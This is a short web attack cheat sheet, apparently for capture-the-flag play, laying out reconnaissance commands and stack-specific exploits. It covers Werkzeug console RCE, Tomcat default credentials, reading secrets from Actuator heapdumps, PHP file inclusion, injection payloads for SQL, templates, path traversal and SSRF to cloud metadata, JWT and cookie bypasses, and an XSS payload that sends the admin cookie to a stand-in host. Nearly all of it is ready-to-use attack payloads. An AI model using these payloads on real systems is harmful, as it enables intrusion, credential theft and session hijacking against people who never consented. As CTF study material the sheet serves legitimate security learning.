# Web Recon Cheatsheet

## First-pass HTTP recon (deterministic order)
1. `curl -sS -D - -o /dev/null http://<host>/` — read ALL headers first.
2. Fetch `/robots.txt`, `/sitemap.xml`, `/.git/HEAD`, `/.env`, `/.well-known/`.
3. Save the HTML; extract every link, form action, JS bundle path:
   `grep -oE 'href="[^"]+"|src="[^"]+"' index.html | sort -u`.
4. Read JS bundles for hidden API endpoints: `grep -oE '"/[a-z0-9_/.-]+"' app.js | sort -u`.

## Fingerprint → known exploit
- Version in `Server` / `X-Powered-By` / body meta → write it down before fuzzing.
- Common quick wins by stack:
  - nginx off-by-slash / alias traversal: try `/../` path normalization with alias locations.
  - Werkzeug debug console: `/console` — if `__init__` PIN is guessable (docker, /etc/machine-id readable), you get RCE.
  - Tomcat manager: `/manager/html` default creds tomcat:s3cret etc.
  - Actuator (Spring): `/actuator/env`, `/actuator/heapdump` → strings heapdump | grep -i pass.
  - PHP: `?page=` LFI (`php://filter/convert.base64-encode/resource=index`), session upload progress.
  - Express/Next: `/_next/static/` leaks, SSRF via internal URL params.

## Injection quick map
- SQLi: quote → error; `' OR 1=1--`; boolean `AND 1=1/1=2`; time `AND SLEEP(5)`.
  sqlmap only after manual confirmation; `--batch --level 2 --risk 2`.
- SSTI: `{{7*7}}` (Jinja), `${7*7}` (EL), `<%= 7*7 %>` (ERB), `{{7*'7'}}` distinguishes Jinja2/Twig.
- Path traversal: `../../../../etc/passwd`, URL-encoded, `....//`, `php://filter`, `/proc/self/environ`.
- SSRF: url/fetch/callback params → `http://127.0.0.1:PORT/`, cloud metadata `169.254.169.254`.
- XSS to flag: usually exfil admin cookie — but in CTF often the flag is in admin page content; try `<img src=x onerror=fetch('//you/'+document.cookie)>` only with an exfil endpoint.

## Auth bypass patterns
- JWT: none algorithm, weak HMAC secret (hashcat -m 16500), kid injection (`kid: ../../dev/null`), alg confusion RS256→HS256.
- Cookies: base64 decode everything; flask session cookie → flask-unsign --wordlist.
- Default creds matrix: admin/admin, admin/password, guest/guest, tomcat/s3cret, machine-name/machine-name.
